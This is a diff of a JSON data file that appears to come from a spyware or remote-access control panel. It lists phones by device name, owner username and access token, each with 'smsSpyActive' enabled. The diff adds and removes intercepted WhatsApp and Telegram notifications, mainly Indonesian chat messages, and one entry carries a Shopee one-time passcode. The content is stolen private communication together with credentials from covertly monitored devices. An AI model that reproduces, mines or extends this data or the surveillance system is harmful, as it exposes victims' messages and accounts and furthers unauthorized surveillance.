@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776775600762,
+    "lastSeen": 1776775603842,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3735 pesan dari 23 chat",
+        "time": "21/04 19:46",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776775604833
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎7Sex Message (224 pesan): ~ ?",
+        "content": "paduan sempurna, tapi masi perbaikan",
+        "time": "21/04 19:46",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776775604801
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3734 pesan dari 23 chat",
+        "time": "21/04 19:46",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776775604067
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎7Sex Message (223 pesan): ~ ?",
+        "content": "fc invis ama delayxforce",
+        "time": "21/04 19:46",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776775604017
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -10296,38 +10328,6 @@
         "time": "21/04 19:20",
         "pkg": "com.whatsapp",
         "receivedAt": 1776774025423
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎7Sex Message (201 pesan): ~ runcing627",
-        "content": "Iya ini no nya gua jadiin bot arisu",
-        "time": "21/04 19:20",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776774025407
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3583 pesan dari 23 chat",
-        "time": "21/04 19:20",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776774024454
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB byone/mabar ff 8a (41 pesan): Givano",
-        "content": "@⁨diga⁩ bikin lah cr",
-        "time": "21/04 19:20",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776774024342
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3582 pesan dari 23 chat",
-        "time": "21/04 19:20",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776774022767
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776775601774,
+    "lastSeen": 1776775604562,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10387,7 +10387,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776775599607,
+    "lastSeen": 1776775602490,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -10403,6 +10403,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "[ suendi ]",
+        "content": "Pesan baru dari 1 chat",
+        "time": "21/04 19:46",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776775604370
+      },
       {
         "appName": "Telegram",
         "sender": "GB CPANEL BY PRABOWO: ZEEIN STORE",
@@ -14394,14 +14402,6 @@
         "time": "21/04 19:09",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776773362387
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Fastcal haikk",
-        "content": "🔔 NEW OTP RECEIVED!\n━━━━━━━━━━━━━━━\n📱 Service: WHATSAPP\n🌍 Country: Indonesia\n📞 Number: +62********445\n💰 Price: Rp 6.700\n🔢 Code: 235740\n━━━━━━━━━━━━━━━\n📨 Message:\nSHOPEE: Gunakan Kode OTP 235740 UNTUK DAFTAR AKUN SHOPEE. Hanya berlaku 15 menit. JANGAN berikan kode ke siapa pun, termasuk pihak Shopee.\njKPmMcdNAgI\n━━━━━━━━━━━━━━━\n🏷️ Provider ID: RO0006715956\n🏷️ System ID: FSCL50574762\n⏰ 21 Apr 2026 • 19:01 WIB\n\n#OTP #WHATSAPP",
-        "time": "21/04 19:09",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776773362366
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776775602059,
+    "lastSeen": 1776775603224,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
